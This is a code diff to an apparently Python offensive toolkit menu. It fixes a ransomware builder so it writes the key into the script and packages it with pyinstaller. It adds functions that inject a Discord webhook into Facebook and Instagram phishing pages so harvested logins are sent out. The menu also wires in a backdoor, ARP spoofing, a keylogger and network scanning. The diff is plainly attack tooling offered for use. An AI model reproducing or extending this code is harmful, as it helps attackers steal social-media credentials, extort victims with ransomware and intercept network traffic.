@@ -110,9 +110,25 @@ def Ransomware_decrypt():
     with open("Ransomware/ransom_decrypted.py","r") as file:
         a=file.read()
         a=a.replace("1122",key)
-    with open("Ransomware/ransom_decrypted.py","r") as file:
+    with open("Ransomware/ransom_decrypted.py","w") as file:
         file.write(a)
     sb.call(["pyinstaller","--onefile","-w","Ransomware/ransom_decrypted.py"])
+
+def Phishing_f():
+    webhok = input("enter discord webhook: "),
+    with open("Phishing/facebook/index.html","r") as file:
+        a=file.read()
+        a=a.replace("WEBHOOK",webhok)
+    with open("Phishing/facebook/index.html","w") as file:
+        file.write(a)
+
+def Phishing_i():
+    webhok = input("enter discord webhook: "),
+    with open("Phishing/instagram/index.html","r") as file:
+        a=file.read()
+        a=a.replace("WEBHOOK",webhok)
+    with open("Phishing/instagram/index.html","w") as file:
+        file.write(a)
 
 while True:
     print(a)
@@ -133,8 +149,6 @@ while True:
             Backdoor()
         elif user_input == 'use 3':
             netscan()
-        elif user_input == 'use 13':
-            test()
         elif user_input == 'use 2':
             sb.call(["echo","1",">","/proc/sys/net/ipv4/ip_forward"])
             arp_spoof()
@@ -147,7 +161,15 @@ while True:
         elif user_input == 'use 5':
             keylogger()
         elif user_input == 'use 1':
-            print("After selecting the phishing method you want to choose and setting the webhook in the html file, you can run it on the server.for now only available for facebook and instagram will be added soon")
+            temp = input("1-)Facebook 2-)İnstagram example: use 1 enter: ")
+            if temp == 'use 1':
+                Phishing_f()
+                print("file created move to server")
+            elif temp == 'use 2':
+                Phishing_i()
+                print("file created move to server")
+            else:
+                print("ERROR!!")
         elif user_input == 'exit' or user_input == 'EXIT':
             exit()
     except AttributeError:
